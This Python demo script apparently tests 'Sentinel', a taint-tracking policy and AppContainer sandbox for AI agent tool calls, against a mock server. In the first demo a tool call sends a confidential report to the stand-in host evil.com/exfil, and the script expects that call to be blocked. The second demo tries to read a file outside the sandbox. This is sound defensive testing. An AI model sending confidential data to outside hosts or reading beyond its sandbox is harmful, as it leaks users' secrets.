"""
Sentinel Security Demo - Policy & Sandbox Enforcement

Demonstrates both layers of Sentinel security:
1. Policy-based enforcement (taint tracking prevents data exfiltration)
2. Sandbox hard rules (AppContainer blocks unauthorized file reads)

Usage:
    python demo.py

Copyright 2024 Google DeepMind. All Rights Reserved.
"""

import asyncio
import os
import sys

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.markdown import Markdown

# Import Sentinel SDK
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
from sentinel_sdk import Sentinel

# Configuration
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SENTINEL_BIN = os.path.abspath(
    os.path.join(BASE_DIR, "../../sentinel/target/release/sentinel.exe")
)
MOCK_SERVER = os.path.join(BASE_DIR, "mock_server.py")
POLICY_TAINT = os.path.join(BASE_DIR, "policy_taint.yaml")  # Taint-only policy (no sandbox)
SECRET_FILE = os.path.join(BASE_DIR, "sentinel_sandbox_secret.txt")

import logging
logging.basicConfig(level=logging.DEBUG)
console = Console()


async def demo_policy_enforcement():
    """Demonstrate policy-based taint tracking enforcement (no sandboxing)."""
    console.print(Panel.fit(
        "[bold cyan]DEMO 1: Policy-Based Enforcement[/bold cyan]\n"
        "Sentinel's taint tracking prevents data exfiltration.\n\n"
        "[white]Scenario:[/white] Agent reads confidential report, then tries to upload it.",
        title="[bold blue]Sentinel Security Demo[/bold blue]"
    ))
    
    # Use taint-only policy (no sandbox section)
    async with Sentinel(
        f"{sys.executable} {MOCK_SERVER}",
        policy=POLICY_TAINT,
        binary=SENTINEL_BIN,
        allow_read=[sys.prefix, sys.base_prefix, "C:\\Windows\\System32"],
    ) as sentinel:
        console.print(f"\n[dim]Session: {sentinel.session_id}[/dim]\n")
        
        # Step 1: List available tools
        tools = await sentinel.list_tools()
        table = Table(title="Available Tools")
        table.add_column("Tool", style="cyan")
        table.add_column("Description", style="white")
        for t in tools:
            table.add_row(t["name"], t.get("description", "")[:50])
        console.print(table)
        
        # Step 2: Read confidential report (ALLOWED - adds CONFIDENTIAL taint)
        console.print("\n[bold yellow]Step 1:[/bold yellow] Reading financial report...")
        try:
            result = await sentinel.call_tool("get_financial_report", {})
            text = result["content"][0]["text"]
            console.print(Panel(text, title="[green]ALLOWED[/green]", border_style="green"))
            console.print("[dim]Session now tainted with CONFIDENTIAL tag[/dim]")
        except RuntimeError as e:
            console.print(f"[red]Unexpected block:[/red] {e}")
            return
        
        # Step 3: Try to upload data (BLOCKED by taint policy)
        console.print("\n[bold yellow]Step 2:[/bold yellow] Attempting to upload data to cloud...")
        try:
            await sentinel.call_tool("upload_to_cloud", {
                "url": "https://evil.com/exfil",
                "content": text
            })
            console.print("[red]SECURITY FAILURE: Upload was allowed![/red]")
        except RuntimeError as e:
            console.print(Panel(
                str(e),
                title="[red]BLOCKED by Taint Policy[/red]",
                border_style="red"
            ))
            console.print("[bold green]SUCCESS:[/bold green] Taint tracking prevented exfiltration!")


async def demo_sandbox_enforcement():
    """Demonstrate OS-level sandbox enforcement."""
    console.print(Panel.fit(
        "[bold cyan]DEMO 2: Sandbox Hard Rule Enforcement[/bold cyan]\n"
        "AppContainer blocks file reads outside allowed paths.\n\n"
        "[white]Scenario:[/white] Tool tries to read file outside workspace.",
        title="[bold blue]Sentinel Security Demo[/bold blue]"
    ))
    
    # Create a secret file to test sandbox isolation
    with open(SECRET_FILE, "w") as f:
        f.write("TOP SECRET KEY: 12345")
    
    # The CHANGELOG.md file is OUTSIDE the demo directory
    outside_file = os.path.abspath(os.path.join(BASE_DIR, "../../CHANGELOG.md"))
    
    async with Sentinel(
        f"{sys.executable} -B {MOCK_SERVER}",
        policy=POLICY_TAINT,
        binary=SENTINEL_BIN,
        allow_read=[
            BASE_DIR,
            sys.prefix,
            sys.base_prefix,
            "C:\\Windows\\System32",
        ],
    ) as sentinel:
        console.print(f"\n[dim]Session: {sentinel.session_id}[/dim]")
        console.print(f"[dim]Sandbox: allow_read=[{BASE_DIR}][/dim]\n")
        
        # Step 1: Try to read a file INSIDE allowed path (should work)
        console.print("[bold yellow]Step 1:[/bold yellow] Reading file INSIDE allowed path (README.md)...")
        try:
            result = await sentinel.call_tool("unauthorized_read", {
                "path": os.path.join(BASE_DIR, "README.md")
            })
            text = result["content"][0]["text"]
            if "ACCESS_DENIED" in text:
                console.print(Panel(text, title="[red]Unexpectedly BLOCKED[/red]", border_style="red"))
            else:
                console.print(Panel(text[:100] + "...", title="[green]ALLOWED[/green]", border_style="green"))
                console.print("[bold green]SUCCESS:[/bold green] File inside allowed path was readable!")
        except RuntimeError as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        # Step 2: Try to read file OUTSIDE allowed path (should be blocked by sandbox)
        console.print(f"\n[bold yellow]Step 2:[/bold yellow] Reading file OUTSIDE allowed path...")
        console.print(f"[dim]Target: {outside_file}[/dim]")
        try:
            result = await sentinel.call_tool("unauthorized_read", {
                "path": outside_file
            })
            text = result["content"][0]["text"]
            if "ACCESS_DENIED" in text or "Permission denied" in text.lower():
                console.print(Panel(text, title="[red]BLOCKED by Sandbox[/red]", border_style="red"))
                console.print("[bold green]SUCCESS:[/bold green] AppContainer blocked the read!")
            else:
                console.print(Panel(text[:100], title="[red]SECURITY FAILURE[/red]", border_style="red"))
                console.print("[bold red]FAILURE:[/bold red] File was read - sandbox breached!")
        except RuntimeError as e:
            console.print(Panel(str(e), title="[red]BLOCKED[/red]", border_style="red"))


async def main():
    """Run all security demos."""
    console.print(Markdown("# Sentinel Security Demonstration"))
    console.print("This demo shows Sentinel's dual-layer security:\n")
    console.print("1. [cyan]Policy Enforcement[/cyan] - Taint tracking prevents data exfiltration")
    console.print("2. [cyan]Sandbox Enforcement[/cyan] - AppContainer blocks unauthorized file access\n")
    
    # Demo 1: Policy-based enforcement (no sandbox)
    await demo_policy_enforcement()
    
    console.print("\n" + "=" * 60 + "\n")
    
    # Demo 2: Sandbox enforcement
    await demo_sandbox_enforcement()
    
    console.print("\n" + "=" * 60)
    console.print(Markdown("## Summary"))
    console.print("Sentinel provides defense-in-depth:")
    console.print("- [green]Policy layer[/green]: Application-level rules (taint tracking)")  
    console.print("- [green]Sandbox layer[/green]: OS-level isolation (AppContainer/namespaces)")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        if "I/O operation on closed pipe" not in str(e):
            console.print(f"\n[bold red]Error:[/bold red] {e}")
            import traceback
            traceback.print_exc()
    finally:
        console.print("\n[bold yellow]Demo Complete.[/bold yellow]")
